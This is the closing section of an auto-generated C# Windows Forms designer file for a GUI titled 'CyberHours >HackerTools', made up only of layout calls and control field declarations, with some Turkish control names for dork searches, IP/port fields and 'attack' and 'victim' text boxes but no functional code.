            this.Controls.Add(this.label6);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.pictureBox8);
            this.Controls.Add(this.pictureBox5);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "CyberHours >HackerTools";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.panel1.ResumeLayout(false);
            this.panel15.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox10)).EndInit();
            this.panel8.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.panel2.ResumeLayout(false);
            this.panel2.PerformLayout();
            this.groupBox3.ResumeLayout(false);
            this.groupBox2.ResumeLayout(false);
            this.groupBox1.ResumeLayout(false);
            this.panel3.ResumeLayout(false);
            this.panel3.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox9)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).EndInit();
            this.panel9.ResumeLayout(false);
            this.iTalk_GroupBox5.ResumeLayout(false);
            this.iTalk_GroupBox5.PerformLayout();
            this.iTalk_GroupBox4.ResumeLayout(false);
            this.iTalk_GroupBox4.PerformLayout();
            this.panel11.ResumeLayout(false);
            this.panel11.PerformLayout();
            this.panel16.ResumeLayout(false);
            this.iTalk_GroupBox16.ResumeLayout(false);
            this.iTalk_GroupBox16.PerformLayout();
            this.iTalk_GroupBox12.ResumeLayout(false);
            this.iTalk_GroupBox12.PerformLayout();
            this.iTalk_GroupBox14.ResumeLayout(false);
            this.iTalk_GroupBox14.PerformLayout();
            this.iTalk_GroupBox13.ResumeLayout(false);
            this.iTalk_GroupBox13.PerformLayout();
            this.panel17.ResumeLayout(false);
            this.panel17.PerformLayout();
            this.panel21.ResumeLayout(false);
            this.panel22.ResumeLayout(false);
            this.panel22.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox14)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox13)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox12)).EndInit();
            this.panel26.ResumeLayout(false);
            this.iTalk_GroupBox2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox16)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox15)).EndInit();
            this.iTalk_GroupBox1.ResumeLayout(false);
            this.iTalk_GroupBox1.PerformLayout();
            this.panel27.ResumeLayout(false);
            this.panel27.PerformLayout();
            this.panel31.ResumeLayout(false);
            this.iTalk_GroupBox9.ResumeLayout(false);
            this.iTalk_GroupBox9.PerformLayout();
            this.iTalk_GroupBox8.ResumeLayout(false);
            this.iTalk_GroupBox8.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.up)).EndInit();
            this.iTalk_GroupBox7.ResumeLayout(false);
            this.iTalk_GroupBox7.PerformLayout();
            this.iTalk_GroupBox3.ResumeLayout(false);
            this.iTalk_GroupBox3.PerformLayout();
            this.panel32.ResumeLayout(false);
            this.panel32.PerformLayout();
            this.panel36.ResumeLayout(false);
            this.iTalk_GroupBox10.ResumeLayout(false);
            this.iTalk_GroupBox10.PerformLayout();
            this.iTalk_GroupBox6.ResumeLayout(false);
            this.panel37.ResumeLayout(false);
            this.panel37.PerformLayout();
            this.panel41.ResumeLayout(false);
            this.iTalk_GroupBox19.ResumeLayout(false);
            this.iTalk_GroupBox19.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox25)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox26)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox23)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox24)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox22)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox20)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox21)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox19)).EndInit();
            this.iTalk_GroupBox18.ResumeLayout(false);
            this.iTalk_GroupBox17.ResumeLayout(false);
            this.iTalk_GroupBox17.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox18)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox17)).EndInit();
            this.iTalk_GroupBox15.ResumeLayout(false);
            this.iTalk_GroupBox11.ResumeLayout(false);
            this.panel42.ResumeLayout(false);
            this.panel42.PerformLayout();
            this.panel46.ResumeLayout(false);
            this.panel47.ResumeLayout(false);
            this.panel47.PerformLayout();
            this.panel51.ResumeLayout(false);
            this.iTalk_GroupBox21.ResumeLayout(false);
            this.iTalk_GroupBox20.ResumeLayout(false);
            this.iTalk_GroupBox20.PerformLayout();
            this.panel52.ResumeLayout(false);
            this.panel52.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox27)).EndInit();
            this.panel56.ResumeLayout(false);
            this.iTalk_GroupBox22.ResumeLayout(false);
            this.iTalk_GroupBox22.PerformLayout();
            this.panel57.ResumeLayout(false);
            this.panel57.PerformLayout();
            this.panel62.ResumeLayout(false);
            this.panel62.PerformLayout();
            this.panel10.ResumeLayout(false);
            this.effectualGroupBox1.ResumeLayout(false);
            this.effectualGroupBox1.PerformLayout();
            this.iTalk_Panel1.ResumeLayout(false);
            this.iTalk_Panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox28)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.PictureBox pictureBox2;
        private System.Windows.Forms.PictureBox pictureBox3;
        private System.Windows.Forms.PictureBox pictureBox4;
        private System.Windows.Forms.PictureBox pictureBox5;
        private System.Windows.Forms.PictureBox pictureBox6;
        private System.Windows.Forms.PictureBox pictureBox7;
        private System.Windows.Forms.PictureBox pictureBox8;
        private System.Windows.Forms.PictureBox pictureBox9;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.Panel panel2;
        private System.Windows.Forms.Panel panel6;
        private System.Windows.Forms.Panel panel5;
        private System.Windows.Forms.Panel panel4;
        private System.Windows.Forms.Panel panel3;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.Label label11;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.ListBox listBox1;
        private Ambiance.Ambiance_Button_2 ambiance_Button_22;
        private Ambiance.Ambiance_Button_2 ambiance_Button_21;
        private EffectualButtonBlue effectualButtonBlue3;
        private System.Windows.Forms.Panel panel7;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton1;
        private System.Windows.Forms.Panel panel8;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton2;
        private System.Windows.Forms.Label label13;
        private System.Windows.Forms.Label label12;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.Timer Saat;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton3;
        private EffectualGroupBox effectualGroupBox1;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton5;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton4;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton6;
        private System.Windows.Forms.ListBox search;
        private System.Windows.Forms.ListBox listBox3;
        private Ambiance.Ambiance_TextBox ambiance_TextBox1;
        private Ambiance.Ambiance_TextBox textBox1;
        private System.Windows.Forms.PictureBox pictureBox10;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton11;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton10;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton9;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton8;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton7;
        private System.Windows.Forms.Panel panel9;
        private System.Windows.Forms.Panel panel14;
        private System.Windows.Forms.Panel panel13;
        private System.Windows.Forms.Panel panel12;
        private System.Windows.Forms.Panel panel11;
        private System.Windows.Forms.Label label14;
        private System.Windows.Forms.Button button2;
        private iTalk.iTalk_GroupBox iTalk_GroupBox5;
        private System.Windows.Forms.WebBrowser webBrowser2;
        private System.Windows.Forms.Button button5;
        private iTalk.iTalk_Button_2 iTalk_Button_27;
        private iTalk.iTalk_Button_2 iTalk_Button_28;
        private iTalk.iTalk_Button_2 iTalk_Button_29;
        private iTalk.iTalk_Button_2 iTalk_Button_210;
        private System.Windows.Forms.Label label19;
        private System.Windows.Forms.Label label20;
        private System.Windows.Forms.ListBox listBox5;
        private System.Windows.Forms.Label label18;
        private System.Windows.Forms.Label label16;
        private iTalk.iTalk_TextBox_Small özeldork;
        private System.Windows.Forms.Label label17;
        private iTalk.iTalk_ComboBox hazırdork;
        private iTalk.iTalk_GroupBox iTalk_GroupBox4;
        private System.Windows.Forms.WebBrowser webBrowser1;
        private System.Windows.Forms.Button button4;
        private iTalk.iTalk_Button_2 iTalk_Button_26;
        private iTalk.iTalk_Button_2 iTalk_Button_25;
        private iTalk.iTalk_Button_2 iTalk_Button_24;
        private iTalk.iTalk_Button_2 iTalk_Button_23;
        private System.Windows.Forms.Label label15;
        private System.Windows.Forms.Label label21;
        private System.Windows.Forms.ListBox listBox4;
        private System.Windows.Forms.Label label22;
        private System.Windows.Forms.Label label23;
        private iTalk.iTalk_TextBox_Small özel;
        private iTalk.iTalk_ComboBox hazır;
        private System.Windows.Forms.Label label24;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton12;
        private System.Windows.Forms.Panel panel15;
        private System.Windows.Forms.Timer dorkt;
        private System.Windows.Forms.Timer joomla;
        private System.Windows.Forms.Panel panel16;
        private iTalk.iTalk_GroupBox iTalk_GroupBox16;
        private MonoFlat.MonoFlat_Button monoFlat_Button3;
        private MonoFlat.MonoFlat_Button monoFlat_Button2;
        private MonoFlat.MonoFlat_Button monoFlat_Button1;
        private System.Windows.Forms.ListBox listBox2;
        private System.Windows.Forms.Button button11;
        private System.Windows.Forms.Button button12;
        private System.Windows.Forms.Button button13;
        private System.Windows.Forms.Button button14;
        private iTalk.iTalk_TextBox_Small saldır;
        private iTalk.iTalk_TextBox_Small iTalk_TextBox_Small3;
        private System.Windows.Forms.Label label48;
        private System.Windows.Forms.Label label47;
        private iTalk.iTalk_GroupBox iTalk_GroupBox12;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton15;
        private RecuperareIIC.RecuperareIIButton sorgula;
        private System.Windows.Forms.Label label36;
        private iTalk.iTalk_TextBox_Small txtport;
        private System.Windows.Forms.Label label34;
        private iTalk.iTalk_TextBox_Small txtıp;
        private System.Windows.Forms.Label label35;
        private iTalk.iTalk_GroupBox iTalk_GroupBox14;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton13;
        private RecuperareIIC.RecuperareIIButton iTalk_Button_213;
        private System.Windows.Forms.Label label46;
        private System.Windows.Forms.Label label45;
        private System.Windows.Forms.Label label44;
        private System.Windows.Forms.Label label37;
        private iTalk.iTalk_GroupBox iTalk_GroupBox13;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton14;
        private RecuperareIIC.RecuperareIIButton ıpbul;
        private iTalk.iTalk_TextBox_Small ıp;
        private System.Windows.Forms.Label label33;
        private iTalk.iTalk_TextBox_Small url;
        private System.Windows.Forms.Label label32;
        private System.Windows.Forms.Panel panel20;
        private System.Windows.Forms.Panel panel19;
        private System.Windows.Forms.Panel panel18;
        private System.Windows.Forms.Panel panel17;
        private System.Windows.Forms.Label label25;
        private System.Windows.Forms.Button button3;
        private System.Windows.Forms.Timer timer9;
        private System.Windows.Forms.Timer timer10;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton16;
        private System.Windows.Forms.Panel panel21;
        private System.Windows.Forms.WebBrowser webBrowser3;
        private System.Windows.Forms.Panel panel25;
        private System.Windows.Forms.Panel panel24;
        private System.Windows.Forms.Panel panel23;
        private System.Windows.Forms.Panel panel22;
        private System.Windows.Forms.Label label26;
        private System.Windows.Forms.PictureBox pictureBox12;
        private System.Windows.Forms.PictureBox pictureBox13;
        private System.Windows.Forms.PictureBox pictureBox14;
        private Ambiance.Ambiance_Button_2 ambiance_Button_24;
        private Ambiance.Ambiance_Button_2 ambiance_Button_23;
        private Ambiance.Ambiance_Button_2 ambiance_Button_25;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton17;
        private System.Windows.Forms.Panel panel26;
        private iTalk.iTalk_GroupBox iTalk_GroupBox1;
        private Ambiance.Ambiance_TextBox atak;
        private System.Windows.Forms.Label label31;
        private System.Windows.Forms.Label label30;
        private System.Windows.Forms.Panel panel30;
        private System.Windows.Forms.Panel panel29;
        private System.Windows.Forms.Panel panel28;
        private System.Windows.Forms.Panel panel27;
        private System.Windows.Forms.Label label27;
        private System.Windows.Forms.Button button6;
        private iTalk.iTalk_GroupBox iTalk_GroupBox2;
        private System.Windows.Forms.PictureBox pictureBox16;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton20;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton19;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton18;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton21;
        private System.Windows.Forms.PictureBox pictureBox15;
        private System.Windows.Forms.ListBox listBox6;
        private MonoFlat.MonoFlat_Button monoFlat_Button6;
        private MonoFlat.MonoFlat_Button monoFlat_Button5;
        private MonoFlat.MonoFlat_Button monoFlat_Button4;
        private Ambiance.Ambiance_NumericUpDown hours;
        private System.Windows.Forms.Timer timer4;
        private System.Windows.Forms.Timer timer5;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton22;
        private System.Windows.Forms.Panel panel31;
        private iTalk.iTalk_GroupBox iTalk_GroupBox3;
        private Ambiance.Ambiance_TextBox TXT3;
        private System.Windows.Forms.Panel panel35;
        private System.Windows.Forms.Panel panel34;
        private System.Windows.Forms.Panel panel33;
        private System.Windows.Forms.Panel panel32;
        private System.Windows.Forms.Label label28;
        private System.Windows.Forms.Button button7;
        private iTalk.iTalk_GroupBox iTalk_GroupBox7;
        private System.Windows.Forms.CheckBox gizle;
        private System.Windows.Forms.Label label41;
        private System.Windows.Forms.Label label42;
        private System.Windows.Forms.Label label29;
        private System.Windows.Forms.Label label38;
        private System.Windows.Forms.Label label39;
        private System.Windows.Forms.Label label40;
        private iTalk.iTalk_GroupBox iTalk_GroupBox9;
        private Ambiance.Ambiance_TextBox textBox2;
        private System.Windows.Forms.TextBox textBox3;
        private System.Windows.Forms.Label label49;
        private System.Windows.Forms.Label label50;
        private iTalk.iTalk_GroupBox iTalk_GroupBox8;
        private MonoFlat.MonoFlat_Button saldırıd;
        private Ambiance.Ambiance_TextBox KURBAN;
        private MonoFlat.MonoFlat_Button saldırı;
        private System.Windows.Forms.NumericUpDown up;
        private System.Windows.Forms.Label label43;
        private Ambiance.Ambiance_TextBox TXT4;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton23;
        private System.Windows.Forms.Timer timer8;
        private RecuperareIIC.RecuperareIIComboBox com3;
        private RecuperareIIC.RecuperareIIComboBox com1;
        private RecuperareIIC.RecuperareIIComboBox com2;
        private System.Windows.Forms.Panel panel36;
        private MonoFlat.MonoFlat_Button monoFlat_Button9;
        private MonoFlat.MonoFlat_Button monoFlat_Button8;
        private MonoFlat.MonoFlat_Button monoFlat_Button7;
        private iTalk.iTalk_GroupBox iTalk_GroupBox10;
        private iTalk.iTalk_RadioButton iTalk_RadioButton4;
        private iTalk.iTalk_RadioButton iTalk_RadioButton3;
        private iTalk.iTalk_RadioButton iTalk_RadioButton2;
        private iTalk.iTalk_RadioButton iTalk_RadioButton1;
        private System.Windows.Forms.TextBox textBox4;
        private iTalk.iTalk_GroupBox iTalk_GroupBox6;
        private EffectualButtonBlue effectualButtonBlue10;
        private EffectualButtonBlue effectualButtonBlue11;
        private EffectualButtonBlue effectualButtonBlue12;
        private EffectualButtonBlue effectualButtonBlue9;
        private EffectualButtonBlue effectualButtonBlue8;
        private EffectualButtonBlue effectualButtonBlue7;
        private EffectualButtonBlue effectualButtonBlue6;
        private EffectualButtonBlue effectualButtonBlue5;
        private EffectualButtonBlue effectualButtonBlue4;
        private EffectualButtonBlue effectualButtonBlue2;
        private EffectualButtonBlue effectualButtonBlue1;
        private System.Windows.Forms.Panel panel40;
        private System.Windows.Forms.Panel panel39;
        private System.Windows.Forms.Panel panel38;
        private System.Windows.Forms.Panel panel37;
        private System.Windows.Forms.Label label51;
        private System.Windows.Forms.Button button8;
        private System.Windows.Forms.TextBox textBox11;
        private System.Windows.Forms.TextBox textBox10;
        private System.Windows.Forms.TextBox textBox9;
        private System.Windows.Forms.TextBox textBox8;
        private System.Windows.Forms.TextBox textBox7;
        private System.Windows.Forms.TextBox textBox6;
        private System.Windows.Forms.TextBox textBox5;
        private System.Windows.Forms.TextBox textBox16;
        private System.Windows.Forms.TextBox textBox15;
        private System.Windows.Forms.TextBox textBox13;
        private System.Windows.Forms.TextBox textBox12;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton24;
        private System.Windows.Forms.Panel panel41;
        private iTalk.iTalk_GroupBox iTalk_GroupBox11;
        private MonoFlat.MonoFlat_Button monoFlat_Button14;
        private MonoFlat.MonoFlat_Button monoFlat_Button13;
        private MonoFlat.MonoFlat_Button monoFlat_Button12;
        private MonoFlat.MonoFlat_Button monoFlat_Button11;
        private MonoFlat.MonoFlat_Button monoFlat_Button10;
        private System.Windows.Forms.Panel panel45;
        private System.Windows.Forms.Panel panel44;
        private System.Windows.Forms.Panel panel43;
        private System.Windows.Forms.Panel panel42;
        private System.Windows.Forms.Label label52;
        private System.Windows.Forms.Button button9;
        private iTalk.iTalk_GroupBox iTalk_GroupBox15;
        private MonoFlat.MonoFlat_Button monoFlat_Button15;
        private MonoFlat.MonoFlat_Button monoFlat_Button16;
        private MonoFlat.MonoFlat_Button monoFlat_Button17;
        private MonoFlat.MonoFlat_Button monoFlat_Button18;
        private MonoFlat.MonoFlat_Button monoFlat_Button19;
        private System.Windows.Forms.ColorDialog colorDialog1;
        private iTalk.iTalk_GroupBox iTalk_GroupBox17;
        private System.Windows.Forms.PictureBox pictureBox17;
        private System.Windows.Forms.Label label53;
        private MonoFlat.MonoFlat_Button monoFlat_Button21;
        private MonoFlat.MonoFlat_Button monoFlat_Button20;
        private System.Windows.Forms.OpenFileDialog openFileDialog1;
        private System.Windows.Forms.PictureBox pictureBox18;
        private iTalk.iTalk_GroupBox iTalk_GroupBox19;
        private System.Windows.Forms.Label label62;
        private System.Windows.Forms.Label label60;
        private System.Windows.Forms.PictureBox pictureBox25;
        private System.Windows.Forms.Label label61;
        private System.Windows.Forms.PictureBox pictureBox26;
        private System.Windows.Forms.PictureBox pictureBox23;
        private System.Windows.Forms.PictureBox pictureBox24;
        private System.Windows.Forms.Label label58;
        private System.Windows.Forms.Label label59;
        private System.Windows.Forms.Label label57;
        private System.Windows.Forms.PictureBox pictureBox22;
        private System.Windows.Forms.PictureBox pictureBox20;
        private System.Windows.Forms.Label label55;
        private System.Windows.Forms.Label label56;
        private System.Windows.Forms.PictureBox pictureBox21;
        private System.Windows.Forms.PictureBox pictureBox19;
        private System.Windows.Forms.Label label54;
        private iTalk.iTalk_GroupBox iTalk_GroupBox18;
        private MonoFlat.MonoFlat_Button monoFlat_Button23;
        private MonoFlat.MonoFlat_Button monoFlat_Button22;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton25;
        private System.Windows.Forms.Panel panel46;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton35;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton34;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton33;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton32;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton31;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton30;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton29;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton28;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton27;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton26;
        private System.Windows.Forms.Panel panel50;
        private System.Windows.Forms.Panel panel49;
        private System.Windows.Forms.Panel panel48;
        private System.Windows.Forms.Panel panel47;
        private System.Windows.Forms.Label label63;
        private System.Windows.Forms.Button button10;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton36;
        private System.Windows.Forms.Panel panel51;
        private iTalk.iTalk_GroupBox iTalk_GroupBox21;
        private System.Windows.Forms.RichTextBox richTextBox1;
        private iTalk.iTalk_GroupBox iTalk_GroupBox20;
        private MonoFlat.MonoFlat_Button monoFlat_Button25;
        private Ambiance.Ambiance_TextBox ambiance_TextBox2;
        private MonoFlat.MonoFlat_Button monoFlat_Button24;
        private System.Windows.Forms.Label label65;
        private System.Windows.Forms.Panel panel55;
        private System.Windows.Forms.Panel panel54;
        private System.Windows.Forms.Panel panel53;
        private System.Windows.Forms.Panel panel52;
        private System.Windows.Forms.Label label64;
        private System.Windows.Forms.Button button15;
        private EffectualRadioButton effectualRadioButton3;
        private EffectualRadioButton effectualRadioButton2;
        private EffectualRadioButton effectualRadioButton1;
        private EffectualRadioButton effectualRadioButton6;
        private System.Windows.Forms.Label label66;
        private EffectualRadioButton effectualRadioButton5;
        private MonoFlat.MonoFlat_Button monoFlat_Button26;
        private EffectualRadioButton effectualRadioButton4;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton37;
        private System.Windows.Forms.Label label67;
        private System.Windows.Forms.PictureBox pictureBox27;
        private RecuperareIIC.RecuperareIIButton recuperareIIButton38;
        private System.Windows.Forms.Panel panel56;
        private iTalk.iTalk_GroupBox iTalk_GroupBox22;
        private EffectualButtonBlue effectualButtonBlue22;
        private EffectualButtonBlue effectualButtonBlue21;
        private EffectualButtonBlue effectualButtonBlue20;
        private EffectualButtonBlue effectualButtonBlue19;
        private EffectualButtonBlue effectualButtonBlue18;
        private EffectualButtonBlue effectualButtonBlue17;
        private EffectualButtonBlue effectualButtonBlue16;
        private EffectualButtonBlue effectualButtonBlue15;
        private EffectualButtonBlue effectualButtonBlue14;
        private EffectualButtonBlue effectualButtonBlue13;
        private System.Windows.Forms.Panel panel60;
        private System.Windows.Forms.Panel panel59;
        private System.Windows.Forms.Panel panel58;
        private System.Windows.Forms.Panel panel57;
        private Ambiance.Ambiance_Button_2 ambiance_Button_26;
        private System.Windows.Forms.Label label68;
        private System.Windows.Forms.Label label78;
        private System.Windows.Forms.Label label76;
        private System.Windows.Forms.Label label77;
        private System.Windows.Forms.Label label70;
        private System.Windows.Forms.Label label71;
        private System.Windows.Forms.Label label72;
        private System.Windows.Forms.Label label73;
        private System.Windows.Forms.Label label74;
        private System.Windows.Forms.Label label75;
        private System.Windows.Forms.Label label69;
        private iTalk.iTalk_Panel iTalk_Panel1;
        private System.Windows.Forms.PictureBox pictureBox28;
        private System.Windows.Forms.Panel panel61;
        private System.Windows.Forms.Label label79;
        private MonoFlat.MonoFlat_Button monoFlat_Button27;
        private System.Windows.Forms.Label label80;
        private System.Windows.Forms.Label label81;
        private System.Windows.Forms.Label label82;
        private System.Windows.Forms.Panel panel62;
        private System.Windows.Forms.Button button22;
        private System.Windows.Forms.Button button21;
        private System.Windows.Forms.Label label83;
        private System.Windows.Forms.Button button19;
        private System.Windows.Forms.Button button20;
        private System.Windows.Forms.Panel panel10;
        private System.Windows.Forms.Label label84;
        private System.Windows.Forms.Label label85;
        private System.Windows.Forms.Label label86;
        private System.Windows.Forms.Label label87;
        private System.Windows.Forms.Label label88;
        private System.Windows.Forms.Label label89;
        private System.Windows.Forms.Label label90;
        private System.Windows.Forms.Label label91;
        private System.Windows.Forms.Label label92;
        private System.Windows.Forms.Label label93;
        private System.Windows.Forms.Label label94;
        private System.Windows.Forms.Label label95;
    }
}

